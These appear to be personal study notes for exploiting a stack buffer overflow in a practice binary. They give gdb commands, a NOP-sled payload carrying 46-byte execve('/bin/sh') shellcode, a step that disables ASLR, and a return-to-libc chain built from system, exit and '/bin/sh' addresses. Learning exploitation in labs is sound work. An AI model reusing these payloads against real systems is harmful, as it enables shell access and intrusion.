**Userfull debugger commands**

    gdb rop
    disas vulnerable
    break *0x08048456
    run $(python -c 'print "A"*268')
    x/200xb buffer
    info break
    del <brakpoint number>

**Buffer overflow**

    run $(python -c 'print "\x90"*222 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x30\xf2\xff\xbf"')

# malicious code 46 bytes

**Turn off ASLR**
    sudo sysctl -w kernel.randomize_va_space=0

**Find <system> call**

    (gdb) print system
    >> $1 = {<text variable, no debug info>} 0xb7e41da0 <__libc_system>

**Find <exit> call**

    (gdb) print exit
    >> $2 = {<text variable, no debug info>} 0xb7e359d0 <__GI_exit>

**Find "/bin/sh" string in system library**

    (gdb) find &system,+9999999,"/bin/sh"
    x/s *((char**)environ)
    >> 0xb7f629ab

**Call libc**

    run $(python -c 'print "A"*268 + "\xa0\x1d\xe4\xb7" + "\xd0\x59\xe3\xb7" + "\xab\x29\xf6\xb7"')

